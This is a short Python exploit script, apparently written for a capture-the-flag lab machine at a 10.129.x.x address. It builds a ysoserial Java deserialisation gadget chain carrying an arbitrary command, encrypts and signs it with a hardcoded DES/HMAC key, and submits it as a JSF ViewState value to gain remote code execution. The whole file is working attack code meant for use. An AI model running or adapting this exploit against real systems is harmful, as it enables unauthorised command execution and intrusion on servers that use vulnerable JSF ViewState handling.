#!/usr/bin/env python3
import argparse, base64, subprocess, sys
from urllib.parse import quote
import requests
from Crypto.Cipher import DES
from Crypto.Hash import HMAC, SHA1
from Crypto.Util.Padding import pad

KEY = b"JsF9876-"  # base64 SnNGOTg3Ni0=
URL = "http://10.129.228.116:8080/userSubscribe.faces"
JAR = "ysoserial-master-SNAPSHOT.jar"
JAVA = "/opt/jdk8/bin/java"

def gadget(cmd, chain):
    proc = subprocess.run(
        [JAVA, "-jar", JAR, chain, cmd],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0 or not proc.stdout.startswith(b"\xac\xed"):
        sys.stderr.write(proc.stderr.decode(errors="replace"))
        raise SystemExit("gadget generation failed")
    return proc.stdout

def wrap(raw):
    enc = DES.new(KEY, DES.MODE_ECB).encrypt(pad(raw, 8))
    mac = HMAC.new(KEY, enc, SHA1).digest()
    return base64.b64encode(enc + mac).decode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd")
    ap.add_argument("--chain", default="CommonsCollections5")
    ap.add_argument("--url", default=URL)
    args = ap.parse_args()

    vs = wrap(gadget(args.cmd, args.chain))
    s = requests.Session()
    s.get(args.url, timeout=15)  # JSESSIONID
    data = {
        "j_id_jsp_1623871077_1:email": "a@b.c",
        "j_id_jsp_1623871077_1:submit": "SIGN UP",
        "j_id_jsp_1623871077_1_SUBMIT": "1",
        "javax.faces.ViewState": vs,
    }
    r = s.post(args.url, data=data, timeout=25)
    print(f"chain={args.chain} status={r.status_code} len={len(r.content)}")

if __name__ == "__main__":
    main()
